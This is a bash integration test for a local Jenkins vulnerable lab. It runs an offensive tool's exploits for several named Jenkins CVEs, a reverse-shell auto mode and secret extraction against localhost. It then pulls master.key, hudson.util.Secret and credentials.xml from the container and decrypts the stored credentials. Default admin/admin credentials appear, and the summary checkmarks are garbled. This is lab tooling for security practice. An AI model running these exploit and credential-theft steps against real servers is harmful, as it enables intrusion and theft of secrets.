#!/bin/bash

set -e

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
LAB_DIR="$(dirname "$SCRIPT_DIR")"
JENKINS_BREAKER_DIR="$(dirname "$LAB_DIR")"
OFFSEC_JENKINS_DIR="$(dirname "$LAB_DIR")/../offsec-jenkins"

echo "[*] WSL Jenkins Lab Integration Test"
echo "[*] Comprehensive end-to-end testing of Jenkins Lab + JenkinsBreaker + offsec-jenkins"
echo ""

echo "[1/12] Checking WSL environment..."
if [[ ! -f /proc/version ]]; then
    echo "[!] Not running in WSL/Linux environment"
    exit 1
fi

echo "[+] Running in WSL/Linux"
echo "    User: $(whoami)"
echo "    Distro: $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)"
echo "    Kernel: $(uname -r)"

echo ""
echo "[2/12] Checking Docker installation..."
if ! command -v docker &> /dev/null; then
    echo "[!] Docker is not installed"
    echo "[*] Run: ./scripts/install_docker_wsl.sh"
    exit 1
fi

echo "[+] Docker is installed: $(docker --version)"

if ! docker info &> /dev/null 2>&1; then
    echo "[!] Docker daemon is not running"
    echo "[*] Start Docker with: sudo service docker start"
    exit 1
fi

echo "[+] Docker daemon is running"
docker ps

echo ""
echo "[3/12] Checking docker-compose..."
if docker compose version &> /dev/null 2>&1; then
    echo "[+] Docker Compose (plugin): $(docker compose version)"
    COMPOSE_CMD="docker compose"
elif command -v docker-compose &> /dev/null; then
    echo "[+] Docker Compose (standalone): $(docker-compose --version)"
    COMPOSE_CMD="docker-compose"
else
    echo "[!] docker-compose not found"
    exit 1
fi

echo ""
echo "[4/12] Checking Python3 and dependencies..."
if ! command -v python3 &> /dev/null; then
    echo "[!] Python3 is not installed"
    echo "[*] Run: sudo apt-get install -y python3 python3-pip python3-venv"
    exit 1
fi

echo "[+] Python3: $(python3 --version)"

echo ""
echo "[5/12] Navigating to lab directory..."
cd "$LAB_DIR"
echo "[+] Lab directory: $(pwd)"

echo ""
echo "[6/12] Cleaning up any existing lab containers..."
$COMPOSE_CMD down -v 2>/dev/null || true
sleep 2

echo ""
echo "[7/12] Running setup.sh to start Jenkins Lab..."
./scripts/setup.sh

echo ""
echo "[8/12] Running test_exploits.sh to verify basic vulnerabilities..."
./scripts/test_exploits.sh

echo ""
echo "[9/12] Testing JenkinsBreaker integration..."
cd "$JENKINS_BREAKER_DIR"

if [ ! -f "JenkinsBreaker.py" ]; then
    echo "[!] JenkinsBreaker.py not found at $(pwd)/JenkinsBreaker.py"
    exit 1
fi

echo "[+] JenkinsBreaker.py found"

# Test 1: List CVEs
echo ""
echo "[*] Test 1: Listing available CVEs..."
python3 JenkinsBreaker.py --list-cves || true

# Test 2: Version fingerprinting
echo ""
echo "[*] Test 2: Fingerprinting Jenkins version..."
python3 JenkinsBreaker.py --url http://localhost:8080 --fingerprint || true

# Test 3: Test specific CVEs (at least 5)
echo ""
echo "[*] Test 3: Testing CVE-2024-23897 (CLI Arbitrary File Read)..."
python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2024-23897 || true

echo ""
echo "[*] Test 4: Testing CVE-2019-1003029 (Script Security Groovy RCE)..."
python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2019-1003029 || true

echo ""
echo "[*] Test 5: Testing CVE-2020-2100 (Git Plugin RCE)..."
python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2020-2100 || true

echo ""
echo "[*] Test 6: Testing CVE-2018-1000861 (Stapler RCE)..."
python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2018-1000861 || true

echo ""
echo "[*] Test 7: Testing CVE-2021-21686 (Agent-to-Controller Path Traversal)..."
python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2021-21686 || true

# Test 4: Auto mode (run all applicable exploits)
echo ""
echo "[*] Test 8: Running auto mode with all applicable CVEs..."
python3 JenkinsBreaker.py --url http://localhost:8080 --auto --lhost 127.0.0.1 --lport 9001 || true

# Test 5: Secrets extraction
echo ""
echo "[*] Test 9: Testing secrets extraction..."
python3 JenkinsBreaker.py --url http://localhost:8080 --extract-secrets || true

# Test 6: Report generation
echo ""
echo "[*] Test 10: Generating reports..."
if [ -d "reports" ]; then
    echo "[+] Reports directory exists"
    echo "[*] Reports found:"
    find reports -type f -name "*.json" -o -name "*.md" | head -n 10
else
    echo "[!] Reports directory not found"
fi

echo ""
echo "[10/12] Testing offsec-jenkins credential decryptor..."

CONTAINER_NAME=$(docker ps --filter "name=jenkins" --format "{{.Names}}" 2>/dev/null | head -n 1)

if [ -z "$CONTAINER_NAME" ]; then
    echo "[!] Jenkins container not found"
else
    echo "[+] Jenkins container: $CONTAINER_NAME"
    
    # Extract Jenkins master.key and hudson.util.Secret
    echo "[*] Extracting master.key and hudson.util.Secret from container..."
    
    TEMP_DIR="/tmp/jenkins-creds-test"
    mkdir -p "$TEMP_DIR"
    
    docker exec "$CONTAINER_NAME" cat /var/jenkins_home/secrets/master.key > "$TEMP_DIR/master.key" 2>/dev/null || echo "[!] Failed to extract master.key"
    docker exec "$CONTAINER_NAME" cat /var/jenkins_home/secrets/hudson.util.Secret > "$TEMP_DIR/hudson.util.Secret" 2>/dev/null || echo "[!] Failed to extract hudson.util.Secret"
    docker exec "$CONTAINER_NAME" cat /var/jenkins_home/credentials.xml > "$TEMP_DIR/credentials.xml" 2>/dev/null || echo "[!] Failed to extract credentials.xml"
    
    # Navigate to offsec-jenkins directory
    if [ -d "$OFFSEC_JENKINS_DIR" ]; then
        cd "$OFFSEC_JENKINS_DIR"
        echo "[+] offsec-jenkins directory: $(pwd)"
        
        if [ -f "decrypt.py" ]; then
            echo "[*] Testing credential decryption..."
            
            # Test with extracted files
            python3 decrypt.py \
                --key "$TEMP_DIR/master.key" \
                --secret "$TEMP_DIR/hudson.util.Secret" \
                --xml "$TEMP_DIR/credentials.xml" \
                --export-json "$TEMP_DIR/decrypted_secrets.json" \
                || true
            
            if [ -f "$TEMP_DIR/decrypted_secrets.json" ]; then
                echo "[+] Secrets successfully decrypted and exported to JSON"
                echo "[*] Decrypted secrets summary:"
                cat "$TEMP_DIR/decrypted_secrets.json" | python3 -c "import sys, json; data = json.load(sys.stdin); print(f'Total credentials: {len(data.get(\"credentials\", []))}')" 2>/dev/null || true
            else
                echo "[!] Failed to generate decrypted_secrets.json"
            fi
        else
            echo "[!] decrypt.py not found in offsec-jenkins directory"
        fi
    else
        echo "[!] offsec-jenkins directory not found at: $OFFSEC_JENKINS_DIR"
    fi
fi

echo ""
echo "[11/12] Validating test results..."

TESTS_PASSED=0
TESTS_FAILED=0

# Check if Jenkins Lab started
if curl -s http://localhost:8080 > /dev/null 2>&1; then
    echo "[+] Jenkins Lab is running: PASS"
    TESTS_PASSED=$((TESTS_PASSED + 1))
else
    echo "[!] Jenkins Lab is not running: FAIL"
    TESTS_FAILED=$((TESTS_FAILED + 1))
fi

# Check if JenkinsBreaker ran
if [ -f "$JENKINS_BREAKER_DIR/jenkinsbreaker.log" ]; then
    echo "[+] JenkinsBreaker log exists: PASS"
    TESTS_PASSED=$((TESTS_PASSED + 1))
else
    echo "[!] JenkinsBreaker log not found: FAIL"
    TESTS_FAILED=$((TESTS_FAILED + 1))
fi

# Check if reports were generated
if [ -d "$JENKINS_BREAKER_DIR/reports" ]; then
    REPORT_COUNT=$(find "$JENKINS_BREAKER_DIR/reports" -type f | wc -l)
    if [ $REPORT_COUNT -gt 0 ]; then
        echo "[+] Reports generated ($REPORT_COUNT files): PASS"
        TESTS_PASSED=$((TESTS_PASSED + 1))
    else
        echo "[!] No reports found: FAIL"
        TESTS_FAILED=$((TESTS_FAILED + 1))
    fi
else
    echo "[!] Reports directory not found: FAIL"
    TESTS_FAILED=$((TESTS_FAILED + 1))
fi

# Check if offsec-jenkins decrypted secrets
if [ -f "$TEMP_DIR/decrypted_secrets.json" ]; then
    echo "[+] offsec-jenkins decryption successful: PASS"
    TESTS_PASSED=$((TESTS_PASSED + 1))
else
    echo "[!] offsec-jenkins decryption failed: FAIL"
    TESTS_FAILED=$((TESTS_FAILED + 1))
fi

echo ""
echo "[12/12] Cleanup (optional)..."
echo "[*] Jenkins Lab is still running at http://localhost:8080"
echo "[*] To stop the lab: cd $LAB_DIR && ./scripts/cleanup.sh"
echo ""

echo "============================================"
echo "        WSL INTEGRATION TEST SUMMARY        "
echo "============================================"
echo ""
echo "Tests Passed: $TESTS_PASSED"
echo "Tests Failed: $TESTS_FAILED"
echo ""
echo "Environment:"
echo "  - WSL Distribution: $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)"
echo "  - Docker: $(docker --version)"
echo "  - Python: $(python3 --version)"
echo ""
echo "Tested Components:"
echo "  ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“ Jenkins Lab setup and deployment"
echo "  ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“ Docker integration in WSL"
echo "  ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“ JenkinsBreaker CVE exploits (5+ CVEs)"
echo "  ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“ Secrets extraction and enumeration"
echo "  ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“ offsec-jenkins credential decryption"
echo "  ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“ Report generation"
echo ""
echo "Jenkins Lab Access:"
echo "  URL: http://localhost:8080"
echo "  Username: admin"
echo "  Password: admin"
echo ""
echo "Next Steps:"
echo "  1. Review reports in: $JENKINS_BREAKER_DIR/reports/"
echo "  2. Review decrypted secrets in: $TEMP_DIR/decrypted_secrets.json"
echo "  3. Review JenkinsBreaker log: $JENKINS_BREAKER_DIR/jenkinsbreaker.log"
echo "  4. Stop lab: cd $LAB_DIR && ./scripts/cleanup.sh"
echo ""

if [ $TESTS_FAILED -eq 0 ]; then
    echo "[+] All WSL integration tests PASSED!"
    exit 0
else
    echo "[!] Some tests FAILED. Review output above for details."
    exit 1
fi
